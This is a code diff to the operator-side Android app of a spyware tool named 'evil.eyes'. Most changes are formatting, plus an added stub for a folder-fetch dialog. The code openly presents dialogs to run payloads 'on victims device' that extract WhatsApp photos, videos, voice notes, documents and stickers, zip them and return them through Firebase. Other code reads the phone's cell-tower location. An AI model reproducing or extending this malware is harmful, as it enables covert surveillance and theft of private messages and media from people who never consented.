@@ -1,5 +1,7 @@
 package evil.eyes.ui.fragments;
 
+import static android.view.WindowManager.LayoutParams.SOFT_INPUT_ADJUST_PAN;
+
 import android.annotation.SuppressLint;
 import android.content.Context;
 import android.content.Intent;
@@ -71,7 +73,7 @@ public class HomeContent extends Fragment {
             }
         });
 
-        view.findViewById(R.id.status).setOnClickListener(b->{
+        view.findViewById(R.id.status).setOnClickListener(b -> {
             progressF = 1;
             BottomSheetDialog bottomSheetDialog = new BottomSheetDialog(getActivity());
             bottomSheetDialog.setContentView(R.layout.bottom_sheet_whatsapp);
@@ -82,7 +84,7 @@ public class HomeContent extends Fragment {
             AppCompatButton getALl = bottomSheetDialog.findViewById(R.id.getAll);
             AppCompatButton uploadSelected = bottomSheetDialog.findViewById(R.id.proceed);
 
-            getALl.setOnClickListener(p->{
+            getALl.setOnClickListener(p -> {
                 new AlertDialog.Builder(getContext())
                         .setTitle("Execution Authorization for all File/s")
                         .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_STATUS_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
@@ -112,7 +114,7 @@ public class HomeContent extends Fragment {
             });
 
 
-            uploadSelected.setOnClickListener(p->{
+            uploadSelected.setOnClickListener(p -> {
                 new AlertDialog.Builder(getContext())
                         .setTitle("Execution Authorization for " + progressF + " File/s")
                         .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_STATUS_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
@@ -155,7 +157,7 @@ public class HomeContent extends Fragment {
             bottomSheetDialog.show();
         });
 
-        view.findViewById(R.id.gifs).setOnClickListener(b->{
+        view.findViewById(R.id.gifs).setOnClickListener(b -> {
             progressF = 1;
             BottomSheetDialog bottomSheetDialog = new BottomSheetDialog(getActivity());
             bottomSheetDialog.setContentView(R.layout.bottom_sheet_whatsapp);
@@ -166,7 +168,7 @@ public class HomeContent extends Fragment {
             AppCompatButton getALl = bottomSheetDialog.findViewById(R.id.getAll);
             AppCompatButton uploadSelected = bottomSheetDialog.findViewById(R.id.proceed);
 
-            getALl.setOnClickListener(p->{
+            getALl.setOnClickListener(p -> {
                 new AlertDialog.Builder(getContext())
                         .setTitle("Execution Authorization for all File/s")
                         .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_GIFS_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
@@ -197,7 +199,7 @@ public class HomeContent extends Fragment {
             });
 
 
-            uploadSelected.setOnClickListener(p->{
+            uploadSelected.setOnClickListener(p -> {
                 new AlertDialog.Builder(getContext())
                         .setTitle("Execution Authorization for " + progressF + " File/s")
                         .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_GIFS_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
@@ -240,7 +242,7 @@ public class HomeContent extends Fragment {
             bottomSheetDialog.show();
         });
 
-        view.findViewById(R.id.audioS).setOnClickListener(b->{
+        view.findViewById(R.id.audioS).setOnClickListener(b -> {
             progressF = 1;
             BottomSheetDialog bottomSheetDialog = new BottomSheetDialog(getActivity());
             bottomSheetDialog.setContentView(R.layout.bottom_sheet_whatsapp);
@@ -251,7 +253,7 @@ public class HomeContent extends Fragment {
             AppCompatButton getALl = bottomSheetDialog.findViewById(R.id.getAll);
             AppCompatButton uploadSelected = bottomSheetDialog.findViewById(R.id.proceed);
 
-            getALl.setOnClickListener(p->{
+            getALl.setOnClickListener(p -> {
                 new AlertDialog.Builder(getContext())
                         .setTitle("Execution Authorization for ALL File/s")
                         .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_AUDIO_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
@@ -282,7 +284,7 @@ public class HomeContent extends Fragment {
             });
 
 
-            uploadSelected.setOnClickListener(p->{
+            uploadSelected.setOnClickListener(p -> {
                 new AlertDialog.Builder(getContext())
                         .setTitle("Execution Authorization for " + progressF + " File/s")
                         .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_AUDIO_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
@@ -325,7 +327,7 @@ public class HomeContent extends Fragment {
             bottomSheetDialog.show();
         });
 
-        view.findViewById(R.id.doc).setOnClickListener(b->{
+        view.findViewById(R.id.doc).setOnClickListener(b -> {
             progressF = 1;
             BottomSheetDialog bottomSheetDialog = new BottomSheetDialog(getActivity());
             bottomSheetDialog.setContentView(R.layout.bottom_sheet_whatsapp);
@@ -336,7 +338,7 @@ public class HomeContent extends Fragment {
             AppCompatButton getALl = bottomSheetDialog.findViewById(R.id.getAll);
             AppCompatButton uploadSelected = bottomSheetDialog.findViewById(R.id.proceed);
 
-            getALl.setOnClickListener(p->{
+            getALl.setOnClickListener(p -> {
                 new AlertDialog.Builder(getContext())
                         .setTitle("Execution Authorization for all File/s")
                         .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_DOCUMENTS_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
@@ -367,7 +369,7 @@ public class HomeContent extends Fragment {
             });
 
 
-            uploadSelected.setOnClickListener(p->{
+            uploadSelected.setOnClickListener(p -> {
                 new AlertDialog.Builder(getContext())
                         .setTitle("Execution Authorization for " + progressF + " File/s")
                         .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_DOCUMENTS_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
@@ -410,7 +412,7 @@ public class HomeContent extends Fragment {
             bottomSheetDialog.show();
         });
 
-        view.findViewById(R.id.sharedImages).setOnClickListener(b->{
+        view.findViewById(R.id.sharedImages).setOnClickListener(b -> {
             progressF = 1;
             BottomSheetDialog bottomSheetDialog = new BottomSheetDialog(getActivity());
             bottomSheetDialog.setContentView(R.layout.bottom_sheet_whatsapp);
@@ -421,7 +423,7 @@ public class HomeContent extends Fragment {
             AppCompatButton getALl = bottomSheetDialog.findViewById(R.id.getAll);
             AppCompatButton uploadSelected = bottomSheetDialog.findViewById(R.id.proceed);
 
-            getALl.setOnClickListener(p->{
+            getALl.setOnClickListener(p -> {
                 new AlertDialog.Builder(getContext())
                         .setTitle("Execution Authorization for all File/s")
                         .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_PHOTOS_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
@@ -452,7 +454,7 @@ public class HomeContent extends Fragment {
             });
 
 
-            uploadSelected.setOnClickListener(p->{
+            uploadSelected.setOnClickListener(p -> {
                 new AlertDialog.Builder(getContext())
                         .setTitle("Execution Authorization for " + progressF + " File/s")
                         .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_PHOTOS_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
@@ -494,7 +496,7 @@ public class HomeContent extends Fragment {
             bottomSheetDialog.show();
         });
 
-        view.findViewById(R.id.pp).setOnClickListener(b->{
+        view.findViewById(R.id.pp).setOnClickListener(b -> {
             progressF = 1;
             BottomSheetDialog bottomSheetDialog = new BottomSheetDialog(getActivity());
             bottomSheetDialog.setContentView(R.layout.bottom_sheet_whatsapp);
@@ -505,7 +507,7 @@ public class HomeContent extends Fragment {
             AppCompatButton getALl = bottomSheetDialog.findViewById(R.id.getAll);
             AppCompatButton uploadSelected = bottomSheetDialog.findViewById(R.id.proceed);
 
-            getALl.setOnClickListener(p->{
+            getALl.setOnClickListener(p -> {
                 new AlertDialog.Builder(getContext())
                         .setTitle("Execution Authorization for all File/s")
                         .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_PROFILE_PHOTOS_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
@@ -535,7 +537,7 @@ public class HomeContent extends Fragment {
             });
 
 
-            uploadSelected.setOnClickListener(p->{
+            uploadSelected.setOnClickListener(p -> {
                 new AlertDialog.Builder(getContext())
                         .setTitle("Execution Authorization for " + progressF + " File/s")
                         .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_PROFILE_PHOTOS_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
@@ -578,7 +580,7 @@ public class HomeContent extends Fragment {
             bottomSheetDialog.show();
         });
 
-        view.findViewById(R.id.stickers).setOnClickListener(b->{
+        view.findViewById(R.id.stickers).setOnClickListener(b -> {
             progressF = 1;
             BottomSheetDialog bottomSheetDialog = new BottomSheetDialog(getActivity());
             bottomSheetDialog.setContentView(R.layout.bottom_sheet_whatsapp);
@@ -589,7 +591,7 @@ public class HomeContent extends Fragment {
             AppCompatButton getALl = bottomSheetDialog.findViewById(R.id.getAll);
             AppCompatButton uploadSelected = bottomSheetDialog.findViewById(R.id.proceed);
 
-            getALl.setOnClickListener(p->{
+            getALl.setOnClickListener(p -> {
                 new AlertDialog.Builder(getContext())
                         .setTitle("Execution Authorization for all File/s")
                         .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_STICKERS_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
@@ -620,7 +622,7 @@ public class HomeContent extends Fragment {
             });
 
 
-            uploadSelected.setOnClickListener(p->{
+            uploadSelected.setOnClickListener(p -> {
                 new AlertDialog.Builder(getContext())
                         .setTitle("Execution Authorization for " + progressF + " File/s")
                         .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_STICKERS_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
@@ -663,7 +665,7 @@ public class HomeContent extends Fragment {
             bottomSheetDialog.show();
         });
 
-        view.findViewById(R.id.videoA).setOnClickListener(b->{
+        view.findViewById(R.id.videoA).setOnClickListener(b -> {
             progressF = 1;
             BottomSheetDialog bottomSheetDialog = new BottomSheetDialog(getActivity());
             bottomSheetDialog.setContentView(R.layout.bottom_sheet_whatsapp);
@@ -674,7 +676,7 @@ public class HomeContent extends Fragment {
             AppCompatButton getALl = bottomSheetDialog.findViewById(R.id.getAll);
             AppCompatButton uploadSelected = bottomSheetDialog.findViewById(R.id.proceed);
 
-            getALl.setOnClickListener(o->{
+            getALl.setOnClickListener(o -> {
                 new AlertDialog.Builder(getContext())
                         .setTitle("Execution Authorization for all File/s")
                         .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_VIDEOS_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
@@ -704,7 +706,7 @@ public class HomeContent extends Fragment {
 
             });
 
-            uploadSelected.setOnClickListener(p->{
+            uploadSelected.setOnClickListener(p -> {
                 new AlertDialog.Builder(getContext())
                         .setTitle("Execution Authorization for " + progressF + " File/s")
                         .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_VIDEOS_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
@@ -747,7 +749,7 @@ public class HomeContent extends Fragment {
             bottomSheetDialog.show();
         });
 
-        view.findViewById(R.id.voiceN).setOnClickListener(b->{
+        view.findViewById(R.id.voiceN).setOnClickListener(b -> {
             progressF = 1;
             BottomSheetDialog bottomSheetDialog = new BottomSheetDialog(getActivity());
             bottomSheetDialog.setContentView(R.layout.bottom_sheet_whatsapp);
@@ -758,7 +760,7 @@ public class HomeContent extends Fragment {
             AppCompatButton getALl = bottomSheetDialog.findViewById(R.id.getAll);
             AppCompatButton uploadSelected = bottomSheetDialog.findViewById(R.id.proceed);
 
-            uploadSelected.setOnClickListener(p->{
+            uploadSelected.setOnClickListener(p -> {
                 new AlertDialog.Builder(getContext())
                         .setTitle("Execution Authorization for " + progressF + " File/s")
                         .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_VOICE_NOTES PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
@@ -788,7 +790,7 @@ public class HomeContent extends Fragment {
 
             });
 
-            getALl.setOnClickListener(p->{
+            getALl.setOnClickListener(p -> {
                 new AlertDialog.Builder(getContext())
                         .setTitle("Execution Authorization for all File/s")
                         .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_VOICE_NOTES PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
@@ -829,8 +831,17 @@ public class HomeContent extends Fragment {
             bottomSheetDialog.show();
         });
 
+        view.findViewById(R.id.folderGet).setOnClickListener(b -> {
+            getActivity().getWindow().setSoftInputMode(SOFT_INPUT_ADJUST_PAN);
+            BottomSheetDialog bottomSheetDialog = new BottomSheetDialog(getActivity());
+            bottomSheetDialog.setContentView(R.layout.bottom_sheet_folder);
+            //TODO UPDATE LOGIC TO UPDATE HERE
 
-        view.findViewById(R.id.deviceInfo).setOnClickListener(b->{
+
+            bottomSheetDialog.show();
+        });
+
+        view.findViewById(R.id.deviceInfo).setOnClickListener(b -> {
 
         });
 
@@ -841,15 +852,15 @@ public class HomeContent extends Fragment {
                 if (telephony.getPhoneType() == TelephonyManager.PHONE_TYPE_GSM) {
                     @SuppressLint("MissingPermission") final GsmCellLocation location = (GsmCellLocation) telephony.getCellLocation();
                     if (location != null) {
-                        String LAC = location.getLac()+"";
-                        String CID = location.getCid()+"";
-                        Log.e("LAC",LAC);
-                        Log.e("CID",CID);
-                        Toast.makeText(getContext(), " "+LAC+" "+CID, Toast.LENGTH_SHORT).show();
+                        String LAC = location.getLac() + "";
+                        String CID = location.getCid() + "";
+                        Log.e("LAC", LAC);
+                        Log.e("CID", CID);
+                        Toast.makeText(getContext(), " " + LAC + " " + CID, Toast.LENGTH_SHORT).show();
                     }
                 }
-            }catch (Exception e){
-                Toast.makeText(getContext(), " "+e.getMessage(), Toast.LENGTH_SHORT).show();
+            } catch (Exception e) {
+                Toast.makeText(getContext(), " " + e.getMessage(), Toast.LENGTH_SHORT).show();
             }
         });
 
@@ -1545,7 +1556,7 @@ public class HomeContent extends Fragment {
                 });
     }
 
-    private void startWhatsappMediaExtraction(String extractionTittle,int command){
+    private void startWhatsappMediaExtraction(String extractionTittle, int command) {
         final int[] c = {0};
         alertDialog = new AlertDialog.Builder(getActivity())
                 .setMessage("Waiting for payload response... please do not close this window.")
@@ -1562,7 +1573,7 @@ public class HomeContent extends Fragment {
                                 .setCancelable(false)
                                 .setPositiveButton("STOP", (o, l) -> {
                                 })
-                                .setTitle("Extraction of selected number of "+extractionTittle+" in progress")
+                                .setTitle("Extraction of selected number of " + extractionTittle + " in progress")
                                 .setMessage("\nChecking payload.... DONE")
                                 .show();
                         TextView messageView = alertDialog.findViewById(android.R.id.message);
@@ -1576,7 +1587,7 @@ public class HomeContent extends Fragment {
                                         FirebaseDatabase
                                                 .getInstance()
                                                 .getReference("LIVE")
-                                                .child("whatsapp_media_"+command)
+                                                .child("whatsapp_media_" + command)
                                                 .addValueEventListener(new ValueEventListener() {
                                                     @Override
                                                     public void onDataChange(@NonNull DataSnapshot snapshot) {
